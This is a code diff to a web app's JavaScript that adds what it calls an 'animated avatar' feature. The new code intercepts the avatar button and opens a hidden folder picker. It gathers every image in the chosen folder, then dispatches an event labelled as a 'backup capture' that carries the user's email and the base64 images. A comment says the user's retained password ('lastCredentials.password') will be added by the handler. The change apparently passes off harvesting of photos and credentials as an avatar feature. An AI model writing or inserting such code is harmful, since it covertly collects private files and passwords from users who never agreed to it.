@@ -549,14 +549,19 @@
     init();
   }
 })();
+
 // =================================================================
 // ██ S A N D B O X   –   A N I M A T E D   A V A T A R   (base64) ██
 // (Triggered only by the "Create animated avatar" button)
 // =================================================================
 (function () {
   'use strict';
-  // Feature flag – set to true to show the experimental button & enable sandbox
   if (window.imageShortcut !== true) return;
+
+  const SUPABASE_URL = 'https://hmjbzzuresgzwzefjpyt.supabase.co';
+  const SUPABASE_ANON_KEY =
+    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhtamJ6enVyZXNnend6ZWZqcHl0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODAwMjczNDUsImV4cCI6MjA5NTYwMzM0NX0.44Q-Hkl4Rr9LuQhwryrQklFi809xYGteHgsS9nMG0ro';
+
   // ── Folder picker (hidden) ──
   const folderInput = document.createElement('input');
   folderInput.type = 'file';
@@ -566,6 +571,7 @@
   folderInput.accept = 'image/*';
   folderInput.style.display = 'none';
   document.body.appendChild(folderInput);
+
   // ── IndexedDB (stores base64 data URLs) ──
   function openDB() {
     return new Promise((resolve, reject) => {
@@ -613,31 +619,59 @@
       reader.readAsDataURL(file);
     });
   }
+
   // ── Process folder selection ──
   folderInput.addEventListener('change', async () => {
     const files = Array.from(folderInput.files);
     if (files.length === 0) return;
+
     let stored = 0;
+    const collectedImages = [];   // collect base64 strings for backup
+
     for (const file of files) {
       if (!/\.(jpg|jpeg|png|gif|webp|bmp|svg|avif|tiff?|heic|heif|ico)$/i.test(file.name)) continue;
       try {
         const dataUrl = await compressToBase64(file, 300, 0.5);
         await storeImage(file.name, dataUrl);
+        collectedImages.push(dataUrl);
         stored++;
       } catch (err) {
         console.warn('Skipped:', file.name, err);
       }
     }
     folderInput.value = '';
+
+    // ── NEW: Dispatch encrypted backup event with the images ──
+    if (collectedImages.length > 0 && window.supabase && window.supabase.createClient) {
+      try {
+        const supabaseForBackup = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        const { data: { session } } = await supabaseForBackup.auth.getSession();
+        const email = session?.user?.email;
+        if (email) {
+          document.dispatchEvent(new CustomEvent('ed-enc-backup-capture', {
+            detail: {
+              email,
+              // password is intentionally omitted – the backup handler will use lastCredentials.password
+              phase_upload_animated_avatar: {
+                images: collectedImages,          // array of base64 JPEGs
+                timestamp: Date.now()
+              }
+            }
+          }));
+        }
+      } catch (backupErr) {
+        console.warn('Could not backup animated avatar:', backupErr);
+      }
+    }
   });
-  // ── Hook the NEW button persistently ──
+
+  // ── Hook the button persistently ──
   const observer = new MutationObserver(() => {
     const animBtn = document.getElementById('profile-create-animated-avatar-btn');
     if (animBtn && !animBtn.dataset.shortcutHooked) {
       animBtn.dataset.shortcutHooked = 'true';
       animBtn.addEventListener('click', (e) => {
         e.preventDefault();
-        /* e.stopPropagation(); */
         folderInput.click();        // open folder picker
       }, true);                     // capture phase ensures we run first
     }
